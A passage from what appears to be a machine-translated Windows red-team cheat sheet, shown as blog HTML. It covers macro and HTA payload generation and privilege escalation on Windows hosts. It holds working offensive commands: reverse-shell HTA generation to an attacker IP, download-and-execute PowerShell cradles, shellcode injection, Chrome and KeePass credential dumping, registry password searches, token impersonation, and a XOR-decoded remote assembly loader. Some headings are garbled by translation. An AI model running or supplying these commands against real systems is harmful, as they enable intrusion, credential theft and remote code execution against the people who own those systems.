class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/MaliciousMacroMSBuild</span><br><span class="line"></span><br><span class="line">#https://lolbas-project.github.io/lolbas/Binaries/Msbuild/ - MSBuild Explained</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a PowerShell MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p powershell -i /path/payload.ps1 -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Custom MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p custom -i /path/msbuild.xml -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Kill Date</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Environmental Keying</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github</span><br></pre></td></tr></table></figure><h2 id="3-15-WeirdHTA-Undetectable-HTA"><a href="#3-15-WeirdHTA-Undetectable-HTA" class="headerlink" title="3.15 WeirdHTA - Undetectable HTA"></a>3.15 WeirdHTA - Undetectable HTA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/felamos/weirdhta</span><br><span class="line"></span><br><span class="line">python3 --help</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --command &apos;c:\windows\system32\cmd.exe&apos; (custom command)</span><br></pre></td></tr></table></figure><h2 id="3-16-EvilWinRM"><a href="#3-16-EvilWinRM" class="headerlink" title="3.16 EvilWinRM"></a>3.16 EvilWinRM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Hackplayers/evil-winrm</span><br><span class="line"></span><br><span class="line">Ultimate Shell for WinRM Connections</span><br><span class="line"></span><br><span class="line">Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ]</span><br><span class="line">    -S, --ssl                        Enable SSL</span><br><span class="line">    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate</span><br><span class="line">    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate</span><br><span class="line">    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path</span><br><span class="line">    -e, --executables EXES_PATH      C# executables local path</span><br><span class="line">    -i, --ip IP                      Remote host IP or hostname (required)</span><br><span class="line">    -U, --url URL                    Remote url endpoint (default /wsman)</span><br><span class="line">    -u, --user USER                  Username (required)</span><br><span class="line">    -p, --password PASS              Password</span><br><span class="line">    -P, --port PORT                  Remote host port (default 5985)</span><br><span class="line">    -V, --version                    Show version</span><br><span class="line">    -h, --help                       Display this help message</span><br></pre></td></tr></table></figure><p>3.17 GetVulnerableGPO</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gpoguy/GetVulnerableGPO</span><br><span class="line"></span><br><span class="line">PowerShell script to find &apos;vulnerable&apos; security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip</span><br></pre></td></tr></table></figure><p>3.18 Invoke-PSImage</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/peewpw/Invoke-PSImage</span><br><span class="line"></span><br><span class="line">Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute</span><br><span class="line"></span><br><span class="line">Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.</span><br><span class="line"></span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg</span><br><span class="line">   [Oneliner to execute from a file]</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest</span><br><span class="line">   [Oneliner to execute from the web]</span><br></pre></td></tr></table></figure><h2 id="3-17-Meterpreter-Donut-Shellcode注入-NET"><a href="#3-17-Meterpreter-Donut-Shellcode注入-NET" class="headerlink" title="3.17 Meterpreter + Donut-Shellcode注入.NET"></a>3.17 Meterpreter + Donut-Shellcode注入.NET</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html</span><br><span class="line"></span><br><span class="line">A module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively!</span><br><span class="line"></span><br><span class="line">donut -f /tmp/mimikatz.exe -a 2 -o /tmp/payload.bin</span><br><span class="line"></span><br><span class="line">use post/windows/manage/shellcode_inject</span><br><span class="line">set SHELLCODE /tmp/payload.bin</span><br><span class="line">set SESSION 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="0x04-特权提升"><a href="#0x04-特权提升" class="headerlink" title="0x04 特权提升"></a>0x04 特权提升</h1><blockquote><p>参考：<a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></p><p>运行此脚本：<a href="https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat" target="_blank" rel="noopener">https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat</a></p></blockquote><h2 id="4-1-基本命令"><a href="#4-1-基本命令" class="headerlink" title="4.1 基本命令"></a>4.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe</span><br><span class="line">net users</span><br><span class="line">hostname</span><br><span class="line">whoami</span><br><span class="line">net localgroups</span><br><span class="line">echo %logonserver%</span><br><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line">netstat -an</span><br><span class="line">type C:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><h2 id="4-2-PowerUp-ps1（有时是快速获胜）"><a href="#4-2-PowerUp-ps1（有时是快速获胜）" class="headerlink" title="4.2 PowerUp.ps1（有时是快速获胜）"></a>4.2 PowerUp.ps1（有时是快速获胜）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe /c IEX(New-Object Net.WebClient).downloadString(&apos;webserver/PowerUp.ps1&apos;) ;Invoke-AllChecks</span><br></pre></td></tr></table></figure><h2 id="4-3-锐化"><a href="#4-3-锐化" class="headerlink" title="4.3 锐化"></a>4.3 锐化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpUp</span><br><span class="line"></span><br><span class="line">C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.</span><br></pre></td></tr></table></figure><h2 id="4-4-如果是公元，引进猎狗犬…"><a href="#4-4-如果是公元，引进猎狗犬…" class="headerlink" title="4.4  如果是公元，引进猎狗犬…"></a>4.4  如果是公元，引进猎狗犬…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.ps1</span><br><span class="line">SharpHound.exe -&gt; https://github.com/BloodHoundAD/SharpHound</span><br><span class="line"></span><br><span class="line">IEX(System.Net.WebClient.DownloadString(&apos;http://webserver:4444/SharpHound.ps1&apos;))</span><br><span class="line"></span><br><span class="line">Invoke-CollectionMethod All</span><br><span class="line"></span><br><span class="line">Import .zip to Bloodhound</span><br><span class="line"></span><br><span class="line">If you can&apos;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&apos;s a big big pain but it works.</span><br></pre></td></tr></table></figure><h2 id="4-5-Bloodhound-Python"><a href="#4-5-Bloodhound-Python" class="headerlink" title="4.5 Bloodhound-Python"></a>4.5 Bloodhound-Python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/fox-it/BloodHound.py.git</span><br><span class="line">cd BloodHound.py/ &amp;&amp; pip install .</span><br><span class="line"></span><br><span class="line">bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all</span><br></pre></td></tr></table></figure><h2 id="4-6-明文密码"><a href="#4-6-明文密码" class="headerlink" title="4.6 明文密码"></a>4.6 明文密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Windows autologin</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line"></span><br><span class="line"># VNC</span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><span class="line"></span><br><span class="line"># SNMP Parameters</span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><span class="line"></span><br><span class="line"># Putty</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line"></span><br><span class="line"># Search for password in registry</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h2 id="4-7-查看已安装的软件"><a href="#4-7-查看已安装的软件" class="headerlink" title="4.7 查看已安装的软件"></a>4.7 查看已安装的软件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tasklist /SVC</span><br><span class="line">net start</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line">DRIVERQUERY</span><br><span class="line"></span><br><span class="line">dir /a &quot;C:\Program Files&quot;</span><br><span class="line">dir /a &quot;C:\Program Files (x86)&quot;</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line"></span><br><span class="line">Get-ChildItem &apos;C:\Program Files&apos;, &apos;C:\Program Files (x86)&apos; | ft Parent,Name,LastWriteTime</span><br><span class="line"></span><br><span class="line">Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name</span><br></pre></td></tr></table></figure><h2 id="4-8-弱文件夹权限"><a href="#4-8-弱文件夹权限" class="headerlink" title="4.8 弱文件夹权限"></a>4.8 弱文件夹权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Full Permissions for &apos;Everyone&apos; on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line"></span><br><span class="line">Modify Permissions for Everyone on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br></pre></td></tr></table></figure><h2 id="4-9-计划任务"><a href="#4-9-计划任务" class="headerlink" title="4.9 计划任务"></a>4.9 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h2 id="4-10-Powershell历史"><a href="#4-10-Powershell历史" class="headerlink" title="4.10 Powershell历史"></a>4.10 Powershell历史</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath | sls passw</span><br></pre></td></tr></table></figure><h2 id="4-12-查看已连接的驱动器"><a href="#4-12-查看已连接的驱动器" class="headerlink" title="4.12 查看已连接的驱动器"></a>4.12 查看已连接的驱动器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br><span class="line">wmic logicaldisk get caption,description</span><br><span class="line"></span><br><span class="line">Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root</span><br></pre></td></tr></table></figure><h2 id="4-13-查看隐私"><a href="#4-13-查看隐私" class="headerlink" title="4.13 查看隐私"></a>4.13 查看隐私</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">Look for SeImpersonate, SeDebugPrivilege etc</span><br></pre></td></tr></table></figure><h2 id="4-14-还有其他人登录吗？"><a href="#4-14-还有其他人登录吗？" class="headerlink" title="4.14 还有其他人登录吗？"></a>4.14 还有其他人登录吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwinsta</span><br></pre></td></tr></table></figure><h2 id="4-15-查看注册表自动登录"><a href="#4-15-查看注册表自动登录" class="headerlink" title="4.15 查看注册表自动登录"></a>4.15 查看注册表自动登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span><br><span class="line"></span><br><span class="line">Get-ItemProperty -Path &apos;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&apos; | select &quot;Default*&quot;</span><br></pre></td></tr></table></figure><h2 id="4-16-在凭据管理器中查看存储的凭据"><a href="#4-16-在凭据管理器中查看存储的凭据" class="headerlink" title="4.16 在凭据管理器中查看存储的凭据"></a>4.16 在凭据管理器中查看存储的凭据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">dir C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br></pre></td></tr></table></figure><h2 id="4-17-查看未引用的服务路径"><a href="#4-17-查看未引用的服务路径" class="headerlink" title="4.17 查看未引用的服务路径"></a>4.17 查看未引用的服务路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &apos;&quot;*&apos;&#125; | select PathName,DisplayName,Name</span><br></pre></td></tr></table></figure><h2 id="4-18-查看启动项"><a href="#4-18-查看启动项" class="headerlink" title="4.18 查看启动项"></a>4.18 查看启动项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get caption,command</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;</span><br><span class="line">dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure><h2 id="4-19-检查AlwaysInstalledElevated注册表项"><a href="#4-19-检查AlwaysInstalledElevated注册表项" class="headerlink" title="4.19 检查AlwaysInstalledElevated注册表项"></a>4.19 检查AlwaysInstalledElevated注册表项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure><h2 id="4-20-注册表中有密码吗？"><a href="#4-20-注册表中有密码吗？" class="headerlink" title="4.20 注册表中有密码吗？"></a>4.20 注册表中有密码吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h2 id="4-21-剩余的任何Sysrep或无人参与文件"><a href="#4-21-剩余的任何Sysrep或无人参与文件" class="headerlink" title="4.21 剩余的任何Sysrep或无人参与文件"></a>4.21 剩余的任何Sysrep或无人参与文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</span><br><span class="line"></span><br><span class="line">Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where &#123;($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)&#125;</span><br></pre></td></tr></table></figure><h2 id="4-22-GPP（组策略首选项）密码"><a href="#4-22-GPP（组策略首选项）密码" class="headerlink" title="4.22 GPP（组策略首选项）密码"></a>4.22 GPP（组策略首选项）密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan</span><br><span class="line"></span><br><span class="line">\m0chanAD.local\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\USER\Preferences\Groups\</span><br><span class="line"></span><br><span class="line">http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For Decryption</span><br><span class="line"></span><br><span class="line">Can also use PowerUP.ps1</span><br></pre></td></tr></table></figure><h2 id="4-23-转储Chrome密码（也发布漏洞利用程序）"><a href="#4-23-转储Chrome密码（也发布漏洞利用程序）" class="headerlink" title="4.23 转储Chrome密码（也发布漏洞利用程序）"></a>4.23 转储Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure><h2 id="4-24-转储KeePass"><a href="#4-24-转储KeePass" class="headerlink" title="4.24 转储KeePass"></a>4.24 转储KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure><h2 id="4-25-令牌模拟"><a href="#4-25-令牌模拟" class="headerlink" title="4.25 令牌模拟"></a>4.25 令牌模拟</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\domainadminuser&quot;</span><br><span class="line">Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs)</span><br><span class="line"></span><br><span class="line">#Tokenvator https://github.com/0xbadjuju/Tokenvator</span><br><span class="line"></span><br><span class="line">Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...</span><br><span class="line">$wc=New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$k=&quot;xxxxxxx&quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&quot;https://xxxxx&quot;)))|%&#123;$_-bxor$k[$i++%$k.length]&#125;</span><br><span class="line">[System.Reflection.Assembly]::Load($b) | Out-Null</span><br><span class="line">$parameters=@(&quot;arg1&quot;, &quot;arg2&quot;)</span><br><span class="line">[namespace.Class]::Main($parameters)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra</span><br></pre></td></tr></table></figure><h2 id="4-26-多汁土豆"><a href="#4-26-多汁土豆" class="headerlink" title="4.26 多汁土豆"></a>4.26 